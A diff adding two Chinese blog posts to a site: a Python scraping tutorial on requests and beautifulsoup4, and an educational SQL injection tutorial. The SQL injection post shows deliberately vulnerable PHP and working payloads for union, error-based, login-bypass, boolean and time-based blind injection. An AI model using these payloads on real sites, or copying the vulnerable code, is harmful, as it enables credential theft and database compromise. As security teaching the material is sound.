@@ -152,6 +152,1242 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Python/运用Python语言(五)-网络爬虫和自动化01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/">运用Python语言(五)-网络爬虫和自动化01</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/" class="archive-article-date">
+  	<time datetime="2021-04-18T12:08:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>（1）Python语言提供了很多实现网络爬虫的函数库，包括<strong>urllib、urllib2、urllib3、wget、scrapy、requests等</strong>。对于爬取回来的内容，可以通过<strong>re（正则表达式）、beautifulsoup4等函数库来处理。</strong>其中最主流的两个函数库是<strong>requests和beautifulsoup4</strong>，它们都是第三方库。</p>
+<p>（2）除了网络爬虫，requests库还能实现自动向网站提交数据。</p>
+<p>（3）网络爬虫应用一般分为两个步骤：</p>
+<ul>
+<li>通过网络链接获取网页内容，使用requests函数库</li>
+<li>对获得的网页内容进行处理，使用beautifulsoup4函数库</li>
+</ul>
+<p>（4）采用pip3指令安装requests库。</p>
+<pre><code>pip3 install requests</code></pre>
+<p>（5）采用pip3指令安装beautifulsoup4库，注意：不要安装beautifulsoup库，该库已不再维护。</p>
+<pre><code>pip3 install beautifulsoup4</code></pre>
+<h3 id="扩展：Robots排除协议"><a href="#扩展：Robots排除协议" class="headerlink" title="扩展：Robots排除协议"></a>扩展：Robots排除协议</h3><p>（1）该协议也被称为爬虫协议，它是网站管理者表达是否希望爬虫自动获取网络信息意愿的方法。</p>
+<p>（2）管理者可以在网站根目录放置一个robots.txt文件，并在文件中列出哪些链接不允许爬虫爬取，一般搜索引擎的爬虫会首先捕获这个文件，并根据文件要求爬取网站内容。</p>
+<p>（3）Robots协议重点约定不希望爬虫获取的内容，如果没有改文件则表示网站内容可以被爬虫获得，然而，<strong>Robots协议不是命令和强制手段，只是国际互联网的一种通用道德规范</strong>。绝大部分成熟的搜索引擎爬虫都会遵循这个协议。</p>
+<h2 id="requests库的使用"><a href="#requests库的使用" class="headerlink" title="requests库的使用"></a>requests库的使用</h2><p>要点：requests库是一个用于<strong>处理HTTP请求</strong>的第三方库</p>
+<h3 id="requests库概述"><a href="#requests库概述" class="headerlink" title="requests库概述"></a>requests库概述</h3><p>（1）requests库最大的优点：程序编写过程更接近正常URL访问过程。</p>
+<p>（2）这个库建立在Python语言的urllib3库的基础上，类似这种在其他函数库之上再封装功能、提供更友好函数的方式在Python语言中十分常见。</p>
+<p>（3）requests库支持非常丰富的链接访问功能，包括国际域名和URL获取、HTTP长连接和连接缓存、HTTP会话和Cookie保持、浏览器使用风格的SSL验证、基本的摘要认证、有效的键值对Cookie记录、自动解压缩、自动内容解码、文件分块上传、HTTP(S)代理功能、连接超时处理、数据下载等。更多介绍访问<a target="_blank" rel="noopener" href="http://docs.python-requests.org/">http://docs.python-requests.org</a></p>
+<h3 id="requests库解析"><a href="#requests库解析" class="headerlink" title="requests库解析"></a>requests库解析</h3><p>（1）网络爬虫和信息提交只是requests库能支持的基本功能，其中，与网页请求相关的函数如下表所示</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">get(url[,timeout=n])</td>
+<td align="center">对应于HTTP的GET方式，获取网页最常用的方法，可以增加timeout=n参数，设定每次请求超时时间为n秒</td>
+</tr>
+<tr>
+<td align="center">post(url,data={‘key’:’value’})</td>
+<td align="center">对应于HTTP的POST方式，其中字典用于传递客户数据</td>
+</tr>
+<tr>
+<td align="center">delete(url)</td>
+<td align="center">对应于HTTP的DELETE方式</td>
+</tr>
+<tr>
+<td align="center">head(url)</td>
+<td align="center">对应于HTTP的HEAD方式</td>
+</tr>
+<tr>
+<td align="center">options(url)</td>
+<td align="center">对应于HTTP的OPTIONS方式</td>
+</tr>
+<tr>
+<td align="center">put(url,data={‘key’:’value’})</td>
+<td align="center">对应于HTTP的PUT方式，其中字典用于传递客户数据</td>
+</tr>
+</tbody></table>
+<p>（2）get()是获取网页最常用的方式，在调用requests.get()函数后，返回的网页内容会保存为一个Response对象，其中，get()函数的参数url链接必须采用HTTP或HTTPS方式访问，例如：</p>
+<pre><code class="python">&gt;&gt;&gt; import requests
+&gt;&gt;&gt; r = requests.get(&quot;http://www.baidu.com&quot;)    #使用get方法打开百度链接
+&gt;&gt;&gt; type(r)
+&lt;class &#39;requests.models.Response&#39;&gt;              #返回Response对象</code></pre>
+<p>（3）和浏览器的交互过程一样，requests.get()代表请求过程，它返回的Response对象代表响应。返回内容作为一个对象更便于操作，Response对象的属性如下表所示，<strong>需要采用&lt;a&gt;.&lt;b&gt;形式</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">属性</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">status_code</td>
+<td align="center">HTTP请求的返回状态，整数，200表示连接成功，404表示连接失败</td>
+</tr>
+<tr>
+<td align="center">text</td>
+<td align="center">HTTP响应内容的字符串形式，即url对应的页面内容</td>
+</tr>
+<tr>
+<td align="center">encoding</td>
+<td align="center">HTTP响应内容的编码方式</td>
+</tr>
+<tr>
+<td align="center">content</td>
+<td align="center">HTTP响应内容的二进制形式</td>
+</tr>
+</tbody></table>
+<ul>
+<li>status_code属性返回请求HTTP后的状态，<strong>在处理数据之前要先判断状态情况，若请求未被响应，需要终止内容处理。</strong></li>
+<li>text属性是情趣的页面内容，以字符串形式展示。</li>
+<li>encoding给出了返回页面内容的编码方式，可以通过对encoding属性赋值更改编码方式，以便于处理中文字符。</li>
+</ul>
+<pre><code class="python">&gt;&gt;&gt; import requests
+&gt;&gt;&gt; r = requests.get(&quot;http://www.baidu.com&quot;)
+&gt;&gt;&gt; r.status_code   #返回状态
+200
+&gt;&gt;&gt; r.text         #返回观察内容，中文字符是否能正常显示
+(输出略)中文乱码
+&gt;&gt;&gt; r.encoding     #默认的编码方式是ISO-8859-1，所以中文是乱码
+&#39;ISO-8859-1&#39;
+&gt;&gt;&gt; r.encoding = &#39;utf-8&#39;
+&gt;&gt;&gt; r.text        #更改完成，返回内容中的中文字符可以正常显示
+(输出略)</code></pre>
+<p>（4）除了属性，Response对象还提供一些方法，如下表所示</p>
+<table>
+<thead>
+<tr>
+<th align="center">方法</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">json()</td>
+<td align="center">如果HTTP响应内容包含JSON格式数据，则该方法解析存在的JSON数据</td>
+</tr>
+<tr>
+<td align="center">raise_for_status()</td>
+<td align="center">如果返回的请求状态不是200，则产生异常，用于try-except语句</td>
+</tr>
+</tbody></table>
+<p>（5）使用异常处理语句可以避免设置一堆复杂的if语句，只需要在收到响应时调用raise_for_status()这个方法，就可以避开状态字200以外的各种意外情况。</p>
+<p>（6）requests会产生几种常用异常。</p>
+<ul>
+<li>当遇到网络问题，如DNS查询失败、拒绝连接等，requests会抛出ConnectionError异常；</li>
+<li>遇到无效HTTP响应时，requests则会抛出HTTPError异常；</li>
+<li>若请求url超时，则抛出Timeout异常；</li>
+<li>若请求超过了设定的最大重定向次数，则会抛出一个TooManyRedirects异常。</li>
+</ul>
+<p>（7）获取一个网页内容的函数建议采用如下代码的第2到第9行，第10到第11行是测试代码。</p>
+<pre><code class="python">import requests
+def getHTMLText(url):
+    try:
+        r = requests.get(url,timeout=30)
+        r.raise_for_status()      #如果状态不是200，引发异常
+        r.encoding=&#39;utf-8&#39;        #无论原来用什么编码，都改成utf-8
+        return r.text
+    except:
+        return &quot;&quot;
+url = &quot;http://www.baidu.com&quot;
+print(getHTMLText(url))</code></pre>
+<h3 id="扩展：HTTP的GET和POST"><a href="#扩展：HTTP的GET和POST" class="headerlink" title="扩展：HTTP的GET和POST"></a>扩展：HTTP的GET和POST</h3><p>HTTP协议定义了客户端与服务器交互的不同方法，最基本的方法是GET和POST。二者区别如下：</p>
+<ul>
+<li>GET方式可以通过URL提交数据，待提交数据是URL的一部分；采用POST方式，待提交数据放置在HTML HEADER内。</li>
+<li>GET方式提交的数据最多不超过1024字节，POST没有对提交内容的长度限制。</li>
+<li>安全性问题。使用GET时参数会显示在URL中，而POST不会。若提交数据是敏感数据，一般采用POST方式。</li>
+</ul>
+<h2 id="beautifulsoup4库的使用"><a href="#beautifulsoup4库的使用" class="headerlink" title="beautifulsoup4库的使用"></a>beautifulsoup4库的使用</h2><p>要点：beautifulsoup4库是一个<strong>解析和处理HTML和XML</strong>的第三方库</p>
+<h3 id="beautifulsoup4库概述"><a href="#beautifulsoup4库概述" class="headerlink" title="beautifulsoup4库概述"></a>beautifulsoup4库概述</h3><p>（1）使用requests库获取HTML页面并将其转换成字符串后，需要进一步解析HTML页面格式，提取有用信息，这需要处理HTML和XML的函数库。</p>
+<p>（2）beautifulsoup4库，也被称为Beautiful Soup库或bs4库，最大的优点是能根据HTML和XML语法建立解析树，进而高效解析其中内容。</p>
+<p>（3）HTML建立的web页面一般很复杂，除了有用的内容信息外，还包括大量用于页面格式的元素。beautifulsoup4库将专业的web页面格式解析部分封装成函数，提供了若干有用且便捷的处理函数。</p>
+<p>（4）beautifulsoup4库采用面向对象思想实现，即它把每个页面当做一个对象，通过&lt;a&gt;.&lt;b&gt;的方式调用对象属性(即包含的内容)，或者通过&lt;a&gt;.&lt;b&gt;()的方式调用方法(即处理函数)。</p>
+<p>（5）由于beautifulsoup4库名字的特殊性和采用面向对象方式组织，可以用from-import方式从库中直接引用BeautifulSoup类。该库主页：<a target="_blank" rel="noopener" href="http://www.crummy.com/software/BeautifulSoup/bs4/">http://www.crummy.com/software/BeautifulSoup/bs4/</a></p>
+<pre><code class="python">from bs4 import BeautifulSoup</code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安全进阶/SQL注入原理与实践进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">SQL注入原理与实践进阶</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-04-18T01:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，<strong>SQL注入攻击</strong>指的是通过<strong>构建特殊的输入作为参数传入Web应用程序，</strong>改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序<strong>没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</strong></p>
+<h3 id="从程序编写的角度看SQL注入"><a href="#从程序编写的角度看SQL注入" class="headerlink" title="从程序编写的角度看SQL注入"></a>从程序编写的角度看SQL注入</h3><p>SQL注入漏洞产生的本质原因是<strong>将获取到的用户可控数据在没有经过安全处理的情况下拼接到SQL语句中并发送给数据库服务器执行导致的。</strong></p>
+<pre><code class="php">&lt;?php
+$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,sqleasy);
+$newsid=$_GET[&#39;newsid&#39;];   //用户可控输入(GET情趣的newsid参数)
+
+//拼接到了发送数据库服务器执行的SQL语句中
+$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
+$row = mysqli_fetch_array($result);
+
+echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
+echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;;
+?&gt;</code></pre>
+<h3 id="SQL注入的常见场景"><a href="#SQL注入的常见场景" class="headerlink" title="SQL注入的常见场景"></a>SQL注入的常见场景</h3><h4 id="数据查询功能"><a href="#数据查询功能" class="headerlink" title="数据查询功能"></a>数据查询功能</h4><p>数据查询功能是WEB应用最常见的功能之一，实现方式就是<strong>根据用户提交的查询条件将数据库中的信息查询出来并显示在页面上，此时用户提交的数据通常被拼接到SQL语句的查询条件位置（即where之后）</strong>，这种情况下如果没有进行安全处理，使用<strong>联合查询注入</strong>的方式可以很方便的获取数据库的敏感信息。</p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户的查询条件：
+$newsid=$_GET[&#39;newsid&#39;];
+
+//构造SQL语句查询相关信息
+$result = mysqli_query($con,&quot;SELECT title,context 
+FROM `news` WHERE newsid=$newsid&quot;);
+
+//将结果显示在页面上：
+$row = mysqli_fetch_array($result);
+echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
+echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<pre><code class="sql">联合查询注入
+http://127.0.0.1/sqleasy_webjj/news.php?newsid=0 union select username,password from admin;
+
+实际执行语句
+SELECT title,context FROM `news` WHERE newsid=0 union select username,password from admin;</code></pre>
+<h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>登录功能也是WEB应用的常见功能之一，通常的实现方式就是<strong>将用户输入的用户名和密码在数据库中查询，如果有匹配的结果说明用户名密码正确，即判断为登录成功，否则就登录失败。</strong>这个过程中用户输入的用户名和密码通常也会被拼接到SQL语句的查询条件位置（即where之后），这种情况下如果没有进行安全处理，<strong>攻击者可以插入恶意的SQL语句改变判断条件的结果，达到登录任意账号的目的（即通常说的万能密码攻击）。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的用户名和密码：
+$name=$_POST[&#39;username&#39;]; 
+$pwd=$_POST[&#39;password&#39;];
+
+//构造SQL语句查询admin表中是否有匹配的信息
+$result = mysqli_query($con,&quot;select * from admin 
+where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;);
+
+//根据结果集是否为空判断账号密码是否存在
+$res=mysql_fetch_array($result); 
+if(is_array($res))&#123;
+$login=true;    
+&#125;else&#123; 
+   $login=false; &#125;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png" alt="image-20210423162120756"></p>
+<pre><code class="sql">实际执行语句
+select * from admin where username=&#39;jiaoshou&#39;or&#39;1&#39; and password=&#39;adjflajsdlfl&#39;</code></pre>
+<h4 id="程序将错误信息直接返回页面"><a href="#程序将错误信息直接返回页面" class="headerlink" title="程序将错误信息直接返回页面"></a>程序将错误信息直接返回页面</h4><p>为了方便程序调试，许多程序员会<strong>将SQL查询的报错信息直接回显到页面上。</strong>这种情况下黑客可以<strong>利用特殊的<br>函数或者语法构造错误的SQL语句，使得敏感数据通过报错信息直接回显到页面上。</strong>对于<strong>在线的WEB系统</strong>而言，<br>程序的<strong>错误信息应该记录到日志中</strong>，而不是显示在页面上。</p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//在SQL语句执行后打印报错信息，方便调试
+$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
+if(!empty(mysqli_error($con)))&#123; 
+    echo mysqli_error($con);
+&#125;
+
+//mysqli_error() 函数返回最近调用函数的最后一个错误描述。
+//empty($var) empty()用来检查变量var是否为空，若var为空则返回true，当var存在且是一个非空非零的值时返回false。</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/wiyFLTR1EuBmsJg.png" alt="image-20210423171401714"></p>
+<pre><code class="sql">实际执行语句：SELECT title,context FROM `news` WHERE newsid= 11 and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></pre>
+<h4 id="基于查询条件返回判断结果"><a href="#基于查询条件返回判断结果" class="headerlink" title="基于查询条件返回判断结果"></a>基于查询条件返回判断结果</h4><p>有时候某些功能是<strong>根据用户输入的查询条件，去数据库中查询相关数据，但不会返回查询结果，而是根据查询<br>结果的情况返回某些信息。</strong>例如，根据学生学号查询成绩，根据查询到的分数返回是否及格（而不是具体分数）。<br>由于数据库中的信息不会直接返回到页面，<strong>无法使用联合查询注入</strong>，如果程序员<strong>也没有输出报错信息到页面上</strong>，那<br>么我们是无法直接通过SQL注入获取数据的。此时，<strong>可以采用盲注的方式来尝试获取数据。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的学生id
+$id = $_GET[&#39;id&#39;];
+//构造SQL语句查询info表中是否有匹配的信息
+$result = mysqli_query($con, &quot;SELECT score FROM `info` WHERE id=&#39;$id&#39;&quot;);
+$row = mysqli_fetch_array($result);
+//判断结果是否为空
+    if (is_array($row)) &#123;     //is_array用于检测变量是否为一个数组
+//判断成绩是否及格
+        if ($row[&#39;score&#39;] &gt;= 60) &#123;
+            echo &quot;$id 号同学，恭喜你，成绩及格了&quot;;
+        &#125; else &#123;echo &quot;$id 号同学，很遗憾，你没有及格&quot;;&#125;
+    &#125; else &#123;echo &quot;对不起，你输入的学号不存在&quot;;&#125;&#125;</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/4r2Vj7gG9L6NuQT.png" alt="image-20210423171310802"></p>
+<pre><code class="sql">--substr(string,1,1) 返回字符串的一部分。例如下方代码，返回从第1个到第1个字符
+-- 实际执行语句：
+SELECT score FROM `info` WHERE id=1024 and substr(database(),1,1)=&#39;s&#39;</code></pre>
+<h4 id="数据的插入、修改与删除功能"><a href="#数据的插入、修改与删除功能" class="headerlink" title="数据的插入、修改与删除功能"></a>数据的插入、修改与删除功能</h4><p>除了查询相关的功能以外，对数据库的数据进行数据插入、修改、删除操作也是常见的功能（insert、update<br>、delete），这些功能与查询语句不同的是并不会返回结果集数据（只会返回成功失败的状态码），如果又没有输<br>出报错信息，即使用户输入的数据没有进行安全处理，也难以使用联合查询、报错注入、布尔型盲注等方式注入，<br>这时，<strong>可以采用时间型盲注进行注入。</strong></p>
+<ul>
+<li>程序员思维</li>
+</ul>
+<pre><code class="php">//获取用户输入的信息
+$username = $_POST[&#39;username&#39;];
+$passwd = $_POST[&#39;passwd1&#39;];
+$question = $_POST[&#39;question&#39;];
+$answer = $_POST[&#39;answer&#39;];
+//构造SQL语句将用户输入的信息插入数据库
+$query = &quot;INSERT INTO 
+admin(role,username,password,question,answer) VALUES 
+(&#39;student&#39;,&#39;$username&#39;,&#39;$passwd&#39;,&#39;$question&#39;,&#39;$answer&#39;
+)&quot;;
+mysql_query($query) or die(&quot;Error!!&quot;);</code></pre>
+<ul>
+<li>黑客思维</li>
+</ul>
+<p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20210423172110563.png" alt="image-20210423172110563"></p>
+<pre><code class="sql">--实际执行语句：
+INSERT INTO admin(role,username,password,question,answer) 
+VALUES (&#39;student&#39;,&#39;test2&#39;,&#39;test2&#39;,&#39;&#39;,if(left(database(),1)=&#39;s&#39;,sleep(3),0))#&#39;,&#39;ndsec&#39;)</code></pre>
+<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table>
+<thead>
+<tr>
+<th align="center">基于注入点位置分类</th>
+<th align="center">基于变量数据类型分类</th>
+<th align="center">基于获取数据的方法分类</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">GET注入、POST注入、Cookie注入</td>
+<td align="center">字符型注入、数字型注入</td>
+<td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td>
+</tr>
+</tbody></table>
+<h2 id="SQL注入点的查找与判断"><a href="#SQL注入点的查找与判断" class="headerlink" title="SQL注入点的查找与判断"></a>SQL注入点的查找与判断</h2><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>SQL注入漏洞的测试主要包括<strong>寻找可能的注入点</strong>以及<strong>针对可能的注入点进行测试</strong>两个环节，核心思路和流程如下：</p>
+<p><img src="https://i.loli.net/2021/04/23/qFYGkpnrQszyJUK.png" alt="image-20210423172821267"></p>
+<h3 id="寻找可能的注入点"><a href="#寻找可能的注入点" class="headerlink" title="寻找可能的注入点"></a>寻找可能的注入点</h3><h4 id="服务器能取到的用户输入"><a href="#服务器能取到的用户输入" class="headerlink" title="服务器能取到的用户输入"></a>服务器能取到的用户输入</h4><p>（1）<strong>任何服务器能取到的用户输入，都是可能存在SQL注入的注入点，</strong>对于手工测试而言，通常根据业务找寻可能与数据库有交互的输入作为潜在的注入点进行测试。</p>
+<p>（2）常见注入点：</p>
+<ul>
+<li>表单提交，主要是POST请求，也包括GET请求。</li>
+<li>URL参数提交，主要为GET请求参数。</li>
+<li>Cookie参数提交。</li>
+<li>HTTP请求头部可修改的值，比如：Referer、User_Agent等。</li>
+<li>边缘的输入点，比如.mp3文件的一些文件信息等。</li>
+</ul>
+<p><strong>PS：以PHP为例，通过各类超全局变量可以取到各类用户输入，这些都是潜在的注入点</strong></p>
+<h4 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h4><ul>
+<li>GET请求和POST请求的参数值是最常见的注入点，是测试时需要重点关注的地方。</li>
+<li>除了标准的请求参数值，采用一些特殊数据传输格式的参数值也有可能存在注入点，如JSON或XML格式传输的参<br>数值。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/ESf3YZi76wldJCF.png" alt="image-20210423181050875"></p>
+<p><img src="https://i.loli.net/2021/04/23/nlqosbjvWRXBi59.png" alt="image-20210423181119960"></p>
+<ul>
+<li>Cookie中的一些字段有时也会用于数据库查询或其他操作，往往也是需要关注的潜在注入点。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/6OvbCryUKpWoDMh.png" alt="image-20210423181155681"></p>
+<ul>
+<li>HTTP请求头部的其他字段也可能存在注入点，如refer字段有时会被写入数据库。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/23/A8XJ4hVqDHrg3sc.png" alt="image-20210423181231673"></p>
+<h3 id="SQL注入点的测试"><a href="#SQL注入点的测试" class="headerlink" title="SQL注入点的测试"></a>SQL注入点的测试</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>SQL注入点的测试本质上是基于原理的模糊测试，我们需要根据一个注入点的功能，推测其可能使用的SQL操作、用户输入的数据类型（数字型或字符型）以及用户输入拼接到SQL语句的位置，并尝试构造基础的报错注入语句、布尔盲注或时间盲注语句来验证相关位置是否存在sql注入漏洞。</p>
+<p><strong>注意：在未知源码的情况下，我们只能尽可能尝试构造各类测试语句来对注入点进行测试，如果测试现象符合条件可以认为存在SQL注入漏洞，但测试现象不符合预期并不能100%确定SQL注入漏洞不存在。</strong></p>
+<p><img src="https://i.loli.net/2021/04/23/htUOibI7gH4QRcA.png" alt="image-20210423184225134"></p>
+<h4 id="构造报错注入语句"><a href="#构造报错注入语句" class="headerlink" title="构造报错注入语句"></a>构造报错注入语句</h4><p>在进行SQL注入点测试的时候，<strong>构造报错注入语句是第一步，</strong>报错注入语句的构造相对简单，通常<strong>只要在参数值中增加一些常见的符号就可以让SQL语句产生语法错误</strong>，常见可使用的符号包括单引号、双引号、括号、分号、冒号、斜杠、反斜杠等，可以将这些符号<strong>组合使用</strong>进行尝试。</p>
+<p><img src="https://i.loli.net/2021/04/23/VW2uQz5rx4UHpiv.png" alt="image-20210423184705988"></p>
+<h4 id="报错注入结果判断"><a href="#报错注入结果判断" class="headerlink" title="报错注入结果判断"></a>报错注入结果判断</h4><p>（1）<strong>出现数据库原始报错信息，可以确定存在SQL注入漏洞.</strong></p>
+<p><img src="https://i.loli.net/2021/04/23/WrFHQOf7xXAzcVZ.png" alt="image-20210423184915060"></p>
+<p><img src="https://i.loli.net/2021/04/23/YqhPbHlTLux1oE3.png" alt="image-20210423184815009"></p>
+<p>（2）在输入某些测试payload时导致页面显示异常，包括结果显示异常或出现通用报错信息，都有可能是SQL注入漏洞但也有可能是系统正常的错误处理机制导致的，需要进一步测试。对于没有回显的语句（如插入、修改功能），可以<strong>根据操作结果返回包的状态码、包长度等信息推测SQL语句是否出错。</strong></p>
+<h4 id="布尔型盲注语句的构造"><a href="#布尔型盲注语句的构造" class="headerlink" title="布尔型盲注语句的构造"></a>布尔型盲注语句的构造</h4><p>（1）布尔型盲注语句需要在涉及判断的功能中才能使用，其中最常见的就是在查询条件的位置，分别拼接上一段结果为真和结果为假的判断语句，如果<strong>结果为真时显示效果与原来一致，结果为假时查询不到数据或与原来数据不一致，则认为存在布尔型盲注。</strong></p>
+<p>（2）布尔型盲注的本质就是构造两个分别为真和假的表达式，只要符按照这个思路，可以任意进行构造。</p>
+<p><img src="https://i.loli.net/2021/04/23/lBdabnu4yxCEhwV.png" alt="image-20210423185446985"></p>
+<p><img src="https://i.loli.net/2021/04/23/TCYSLltKdFQJ1nu.png" alt="image-20210423185511489"></p>
+<h4 id="时间型盲注语句构造"><a href="#时间型盲注语句构造" class="headerlink" title="时间型盲注语句构造"></a>时间型盲注语句构造</h4><p>（1）对于没有涉及判断的功能，如插入、更新等语句的数据位置（而非条件语句的位置），或者布尔型盲注的结果无法判断的（如显示均正常或均异常），可以尝试使用时间型盲注语句进行测试，<strong>如果插入时间型盲注语句后服务器延时响应，则认为存在SQL注入漏洞。</strong></p>
+<p>（2）与其他测试方式不同的是，时间型盲注依赖于时间相关函数或语法，每个数据库的函数并不相同只能进行尝试。<br>在实际使用中，通常有直接调用延时函数（或语法）和调用耗时较高的函数（或语法）两种方式：</p>
+<table>
+<thead>
+<tr>
+<th align="center">直接调用延时函数（或语法）</th>
+<th align="center">调用耗时较高的函数（或语法）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MySQL和SQLserver提供了可直接调用的延时函数和语法，如MySQL的sleep()函数和SQLserver的waitfor()语法可直接调用</td>
+<td align="center">针对其他数据库或延时函数(语法)不适用时可以尝试调用耗时较高的函数或语法。如：select BENCHMARK(10000000,MD5(‘a’));</td>
+</tr>
+</tbody></table>
+<p>（3）Mysql：SLEEP函数可以实现延迟，在所有数据位置均可以使用:</p>
+<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
+SELECT title,context FROM `news` WHERE newsid= 11 and sleep(10)
+对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
+SELECT score FROM `info` WHERE name=&#39;lilei&#39;and sleep(10) and &#39;1&#39;</code></pre>
+<p>（4）SQLserver：WAITFOR DELAY 语句可以实现，通常需要跟在条件判断语句之后:</p>
+<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
+SELECT title,context FROM `news` WHERE newsid= 11 waitfor delay &#39;0:0:4&#39;
+对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
+SELECT score FROM `info` WHERE name=&#39;lilei&#39; waitfor delay &#39;0:0:4’</code></pre>
